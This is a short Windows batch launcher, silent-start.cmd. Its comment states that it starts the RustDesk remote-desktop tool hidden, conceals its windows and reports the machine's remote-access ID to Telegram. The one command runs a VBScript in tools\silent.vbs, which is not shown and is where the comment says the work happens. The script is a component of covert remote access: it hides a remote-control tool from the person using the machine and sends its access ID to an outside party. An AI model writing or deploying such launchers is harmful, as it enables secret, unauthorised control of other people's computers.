@echo off
rem silent-start.cmd - start RustDesk hidden, hide its windows, report the ID to Telegram
rem everything happens in tools\silent.vbs, this file only keeps a visible entry point
start "" wscript.exe "%~dp0tools\silent.vbs"
